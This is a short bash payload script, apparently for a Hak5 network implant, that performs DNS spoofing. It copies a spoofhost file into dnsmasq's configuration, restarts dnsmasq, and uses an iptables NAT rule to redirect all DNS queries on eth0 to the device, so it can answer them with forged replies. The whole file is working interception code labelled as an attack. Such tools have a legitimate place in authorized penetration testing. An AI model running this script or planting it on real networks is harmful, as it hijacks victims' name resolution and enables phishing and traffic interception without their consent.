#!/bin/bash
# 
# Title:		DNSSpoof
# Description:	Forge replies to arbitrary DNS queries using DNSMasq
# Author: 		Hak5
# Version:		1.0
# Category: 		interception
# Target: 		Any
# Net Mode:		NAT


function setup() {
	# Show SETUP LED
	LED SETUP

	# Set the network mode to NAT
	NETMODE NAT
	sleep 5

	# Copy the spoofhost file to /tmp/dnsmasq.address
	cp $(dirname ${BASH_SOURCE[0]})/spoofhost /tmp/dnsmasq.address &> /dev/null

	# Restart dnsmasq with the new configuration
	/etc/init.d/dnsmasq restart
}

function run() {
	# Show  ATTACK LED
	LED ATTACK

	# Redirect all DNS traffic to ourselves
	iptables -A PREROUTING -t nat -i eth0 -p udp --dport 53 -j REDIRECT --to-port 53
}

setup
run
